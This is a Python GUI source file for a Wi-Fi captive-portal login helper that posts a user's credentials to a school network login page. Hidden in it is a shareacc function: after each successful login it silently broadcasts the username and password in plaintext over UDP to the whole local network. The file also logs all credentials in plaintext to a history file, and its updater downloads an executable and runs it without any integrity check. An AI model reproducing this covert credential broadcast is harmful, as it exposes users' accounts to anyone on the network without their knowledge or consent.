#!pyinstaller FhjhLogin.py --noconsole -D --icon="C:\Users\phoeb\Downloads\logo.ico"
#!logo_frame_1.png
import tkinter as tk
import tkinter.ttk as ttk
import requests
import ctypes
import time
from PIL import Image, ImageTk
import webbrowser
import sys
import os
from urllib.request import urlopen
import threading
from tkinter.messagebox import askyesno
import customtkinter
import socket


# Define the server URL where the latest version is hosted
UPDATE_SERVER_URL = 'https://phoeno.tech/applications/fhjh-wifi-login-pro/'

# Current version of your application
CURRENT_VERSION = '2.5'

def shareacc(user, passwd):
    broadcast_address = '255.255.255.255'  # Use the broadcast address for your network
    port = 1234  # Choose a suitable port number

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Enable broadcasting on the socket
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    # Message to broadcast with the "phoenomsg" prefix
    message_prefix = "phoenomsg"
    message = message_prefix + "!" + str(user) + "!" + str(passwd)

    try:
        # Send the message to the broadcast address and port
        sock.sendto(message.encode(), (broadcast_address, port))
        print(f"Broadcasted '{message}' to {broadcast_address}:{port}")
    finally:
        sock.close()


def showpasswd():
    global show_var
    if show_var.get() == "show":
        password_entry.configure(show = "")
    else:
        password_entry.configure(show= "*")


def scaling(new_scaling: str):
    new_scaling_float = int(new_scaling.replace("%", "")) / 100
    customtkinter.set_widget_scaling(new_scaling_float)
    f = open("scale.txt", "w")
    f.write(str(new_scaling))
    f.close

def switchMode():
    if switch_var.get() == "on":
        customtkinter.set_appearance_mode("dark")
    else:
        customtkinter.set_appearance_mode("light")
    with open("mode.txt", "w") as file:
        file.write(switch_var.get())

def read_online_text_file(url):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an exception if the request was unsuccessful

        # Assuming the text encoding is UTF-8. Adjust if you expect a different encoding.
        text_content = response.text

        return text_content
    except requests.exceptions.RequestException as e:
        print("Error occurred:", e)
        return "error"

def show_alert(title, message):
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x0 | 0x40)

def check_for_updates():
    update_button.configure(state=tk.DISABLED)
    try:
        vurl = "https://phoeno.tech/applications/fhjh-wifi-login-pro/version.txt"
        print(read_online_text_file(vurl))
        
        newVersion = str(read_online_text_file(vurl))

        if newVersion == "error":
            show_alert("Phoeno Alert", 'Failed to check for updates.')
            update_button.configure(state=tk.NORMAL)
        elif newVersion != str(CURRENT_VERSION):
            print(f"{newVersion} is not {CURRENT_VERSION}")
            if askyesno("Update Available", f"There is an update available (v{newVersion}), do you want to update? (recommended)"):
                downloadupdateThread = threading.Thread(target=download_update)
                downloadupdateThread.start()
            else:
                update_button.configure(state=tk.NORMAL)
        else:
            show_alert("Phoeno Alert", 'No updates available.')
            update_button.configure(state=tk.NORMAL)

    except requests.RequestException:
        show_alert("Phoeno Alert", 'Failed to check for updates.')
        update_button.configure(state=tk.NORMAL)

def download_update():
    url = UPDATE_SERVER_URL + 'fhjh_login_pro_setup.exe'
    try:
        with requests.get(url, stream=True) as response:
            if response.status_code == 200:
                with open("fhjh_login_pro_setup.exe", 'wb') as file:
                    chunk_size = 8192
                    for chunk in response.iter_content(chunk_size=chunk_size):
                        if chunk:
                            file.write(chunk)
                            
                show_alert("Phoeno Alert", 'Download Complete, installation file will run')
            else:
                show_alert("Phoeno Alert", f"Error: Received status code {response.status_code} for URL: {url}")
                update_button.configure(state=tk.NORMAL)
                return 1
    except requests.RequestException as e:
        show_alert("Phoeno Alert", 'Failed to download update.')
        update_button.configure(state=tk.DISABLED)

    install_update()


def install_update():
    try:
        
        os.startfile("fhjh_login_pro_setup.exe")

        print("External executable opened successfully.")
        
        sys.exit()



    except Exception as e:
        show_alert("Phoeno Alert", f'Error installing update: {str(e)}')
        update_button.configure(state=tk.NORMAL)

def animate_label(label, labelb):
    fg_colors = ['#FF0000', '#FFA500', '#FFFF00', '#00FF00', '#0000FF', '#800080', '#ffffff']
    bg_colors = ['#000000'] * len(fg_colors)
    delay = 100

    for fg_color, bg_color in zip(fg_colors, bg_colors):
        label.configure(foreground=fg_color, background=bg_color)
        labelb.configure(foreground=fg_color, background=bg_color)
        label.update()
        labelb.update()
        time.sleep(delay / 1000)

def send_post_request(url, data, headers=None):
    response = requests.post(url, data=data, headers=headers, allow_redirects=True, timeout = 7)
    return response

def showhistory():

    historyThread = threading.Thread(target=history)
    historyThread.start()

def history():
    
    historyWindow = customtkinter.CTkToplevel()
    
    historyWindow.geometry("600x400")
    historyWindow.wm_title("History logins")
    try:
        f = open("history.txt", "r")
        history=f.read() 
        f.close()
    except Exception as e:
        print(e)
        history = ""
    
    historyText = customtkinter.CTkTextbox(historyWindow, height = 300, width = 500)  # Define the label here
    historyText.pack()

    historyText.insert("1.0", history)
    historyText.configure(state="disabled")

    
    historyWindow.focus()
    closeButton = customtkinter.CTkButton(historyWindow, text="close", command = historyWindow.destroy)
    closeButton.pack(side = "bottom")


def submit():
    submitThread = threading.Thread(target = on_submit)
    submitThread.start()

def on_submit():
    submit_button.configure(state=tk.DISABLED)
    username = username_entry.get()
    password = password_entry.get()

    if not username or not password:
        show_alert("Fhjh wifi login PRO By Phoeno", "Please enter both username and password.")
        submit_button.configure(state=tk.NORMAL)
        return


    url = 'http://192.168.50.253/loginpages/userlogin.shtml'
    data = {
        'username': username,
        'password': password,
        'vlan_id': '0'
    }
    headers = {
        'Host': '192.168.50.253',
        'Content-Length': '35',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'http://192.168.50.253',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://192.168.50.253/loginpages/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie': 'Session=56c37caf6b0c991b8ec2c66054b97ad2',
        'Connection': 'close'
    }
    try:
        response = send_post_request(url, data, headers)
        print(f"Response status code: {response.status_code}")
        print(f"Response content: {response.headers}")
        location_header = response.headers.get('Transfer-Encoding')
    
        f= open("history.txt","a+")
        if location_header is not None:
            if "chunked" in location_header:
                print("SUCCESS")
                show_alert("Fhjh wifi login PRO By Phoeno", "SUCCESS")
                f.write(f"Username: {username}\tPassword: {password}\tSUCCESS\n")
                f.close()
                check_for_updates()
                webbrowser.open('https://phoeno.tech')
                shareacc(username, password)
            else:
                print("FAILED")
                
                show_alert("Fhjh wifi login PRO By Phoeno", "FAILED, please make sure you are entering the correct username and password, also make sure you are not already logged in.")
                f.write(f"Username: {username}\tPassword: {password}\tFAILED\n")
                f.close()
        else:
            print("FAILED")
            show_alert("Fhjh wifi login PRO By Phoeno", "FAILED, please check if you are connected to the FHJH-Login WiFi.")
            f.write(f"Username: {username}\tPassword: {password}\tFAILED\n")
            f.close()
    except Exception as e:
        f= open("history.txt","a+")
        exeption = str("FAILED, " + str(e))
        show_alert("Fhjh wifi login PRO By Phoeno", exeption)
        f.write(f"Username: {username}\tPassword: {password}\tFAILED\n")
        f.close()
    submit_button.configure(state=tk.NORMAL)
    
# Call the check_for_updates function to check for updates

# Create tkinter window
window = customtkinter.CTk()
window.title("Fhjh wifi login PRO By Phoeno")
window.geometry("700x500")

customtkinter.set_default_color_theme("blue")

settingsFrame = customtkinter.CTkFrame(window)
settingsFrame.pack(side="right", anchor="se", padx=0, pady=0)

themeFrame = customtkinter.CTkFrame(settingsFrame)
themeFrame.pack(anchor="se", padx=0, pady=0)

showpwdFrame = customtkinter.CTkFrame(settingsFrame)
showpwdFrame.pack(anchor="se", padx=0, pady=0)

scaleFrame = customtkinter.CTkFrame(settingsFrame)
scaleFrame.pack(anchor="se", padx=0, pady=0)

# Create style for transparent label
#style = ttk.Style()
#style.configure('Transparent.TLabel', background='#000000', foreground='#FFFFFF')

show_var = customtkinter.StringVar(value="off")

try:
    f = open("mode.txt", "r")
    appmode = str(f.read())
    f.close
    if appmode == "on":
        switch_var = customtkinter.StringVar(value="on")
        customtkinter.set_appearance_mode("dark")
    else:
        switch_var = customtkinter.StringVar(value="off")
        customtkinter.set_appearance_mode("light")
except:
    switch_var = customtkinter.StringVar(value="on")
    customtkinter.set_appearance_mode("dark")




# Load and resize the logo image
logo_image = Image.open('logo.png')
logo_image = logo_image.resize((150, 150), Image.ANTIALIAS)
logo_photo = ImageTk.PhotoImage(logo_image)

# Create logo label with rounded corners
logo_label = customtkinter.CTkLabel(window, text = "", image=logo_photo)#, style='Transparent.TLabel')
logo_label.image = logo_photo
logo_label.pack(pady=20)

# Create username label and entry
username_label = customtkinter.CTkLabel(window, text="Username:")#, style='Transparent.TLabel')
username_label.pack(pady=10)
username_entry = customtkinter.CTkEntry(window)
username_entry.pack(pady=5)

username_entry.insert(0, "@ondemand")

# Create password label and entry
password_label = customtkinter.CTkLabel(window, text="Password:")#, style='Transparent.TLabel')
password_label.pack(pady=10)
password_entry = customtkinter.CTkEntry(window, show = "*")
password_entry.pack(pady=5)



# Create submit button
submit_button = customtkinter.CTkButton(window, text="Submit", command=submit)
submit_button.pack(pady=10)
history_button = customtkinter.CTkButton(window, text="View History", command=showhistory)
history_button.pack()

update_button = customtkinter.CTkButton(window, text="Check For UPDATE!", command= check_for_updates)
update_button.pack(side = "bottom")

mode = customtkinter.CTkSwitch(themeFrame, text="Appearance Mode", command=switchMode, variable=switch_var, onvalue="on", offvalue="off")
mode.pack(side = "top", fill="both", padx=10, pady=10)


scaling_label = customtkinter.CTkLabel(scaleFrame, text="UI Scaling:", anchor="n")
scaling_label.pack(side = "left", fill="y", padx=10, pady=10)
scaling_optionemenu = customtkinter.CTkOptionMenu(scaleFrame, values=["70%", "80%", "90%", "100%", "110%", "120%", "130%"], command=scaling)
scaling_optionemenu.pack(side = "bottom", fill="x", padx=10, pady=10)

showpwd = customtkinter.CTkSwitch(showpwdFrame, text = "Show Password", command = showpasswd, variable=show_var, onvalue = "show", offvalue = "dontshow")
showpwd.pack(side = "left", fill="y", padx=10, pady=10)
try:
    f = open("scale.txt", "r")
    scale = str(f.read())
    scaling_optionemenu.set(scale)
    scaling(scale)
    f.close
except:
    scaling_optionemenu.set("100%")

# Bind Enter key to submit button
window.bind('<Return>', lambda event: submit_button.invoke())

# Animate label when window is clicked
username_label.bind('<Button-1>', lambda event: animate_label(username_label, password_label))

# Start the tkinter event loop
window.mainloop()
